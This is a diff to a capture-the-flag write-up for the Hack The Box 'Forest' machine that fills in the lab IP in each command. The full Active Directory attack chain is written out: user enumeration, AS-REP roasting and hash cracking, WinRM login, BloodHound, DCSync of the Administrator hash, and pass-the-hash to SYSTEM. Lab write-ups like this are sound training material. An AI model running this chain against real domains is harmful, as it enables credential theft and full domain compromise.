@@ -5,6 +5,7 @@
 | **Platform** | Hack The Box |
 | **OS** | Windows |
 | **Difficulty** | Easy |
+| **IP** | `10.129.82.174` |
 | **Domain** | `htb.local` / `FOREST.htb.local` |
 
 ## Synopsis
@@ -24,8 +25,8 @@ holds **WriteDACL** over the domain. That right is abused to grant a controlled 
 ### Nmap
 
 ```bash
-nmap -p- --min-rate=5000 -T4 <target>
-nmap -p53,88,135,139,389,445,464,593,636,5985,9389 -sCV <target>
+nmap -p- --min-rate=5000 -T4 10.129.82.174
+nmap -p53,88,135,139,389,445,464,593,636,5985,9389 -sCV 10.129.82.174
 ```
 
 DNS, Kerberos, LDAP, SMB, WinRM, plus the Exchange-related `9389` (ADWS). Add
@@ -34,9 +35,9 @@ DNS, Kerberos, LDAP, SMB, WinRM, plus the Exchange-related `9389` (ADWS). Add
 ### Enumerating users (anonymous)
 
 ```bash
-rpcclient -U "" -N <target> -c "enumdomusers"
+rpcclient -U "" -N 10.129.82.174 -c "enumdomusers"
 # or
-crackmapexec smb <target> --users
+crackmapexec smb 10.129.82.174 --users
 ```
 
 This yields the user list, including service accounts such as **svc-alfresco**.
@@ -49,7 +50,7 @@ This yields the user list, including service accounts such as **svc-alfresco**.
 cracked offline:
 
 ```bash
-GetNPUsers.py htb.local/ -usersfile users.txt -no-pass -dc-ip <target>
+GetNPUsers.py htb.local/ -usersfile users.txt -no-pass -dc-ip 10.129.82.174
 # $krb5asrep$23$svc-alfresco@HTB.LOCAL:...
 ```
 
@@ -63,7 +64,7 @@ hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
 Log in over WinRM:
 
 ```bash
-evil-winrm -i <target> -u svc-alfresco -p 's3rvice'
+evil-winrm -i 10.129.82.174 -u svc-alfresco -p 's3rvice'
 ```
 
 The **user flag** is in `C:\Users\svc-alfresco\Desktop\user.txt`.
@@ -75,7 +76,7 @@ The **user flag** is in `C:\Users\svc-alfresco\Desktop\user.txt`.
 Run BloodHound:
 
 ```bash
-bloodhound-python -u svc-alfresco -p 's3rvice' -d htb.local -ns <target> -c all
+bloodhound-python -u svc-alfresco -p 's3rvice' -d htb.local -ns 10.129.82.174 -c all
 ```
 
 `svc-alfresco` is a member of **Account Operators** and (via group nesting) of **Exchange
@@ -103,15 +104,15 @@ Windows Permissions**, which has **WriteDACL** on the domain object. The attack 
 3. DCSync the Administrator hash:
 
    ```bash
-   secretsdump.py htb.local/hacker:'Hacker123!'@<target> -just-dc-user Administrator
+   secretsdump.py htb.local/hacker:'Hacker123!'@10.129.82.174 -just-dc-user Administrator
    # Administrator:500:aad3b...:<admin-nt-hash>:::
    ```
 
 4. Pass-the-Hash to SYSTEM:
 
    ```bash
-   psexec.py htb.local/Administrator@<target> -hashes :<admin-nt-hash>
-   # or: evil-winrm -i <target> -u Administrator -H <admin-nt-hash>
+   psexec.py htb.local/Administrator@10.129.82.174 -hashes :<admin-nt-hash>
+   # or: evil-winrm -i 10.129.82.174 -u Administrator -H <admin-nt-hash>
    ```
 
 ```
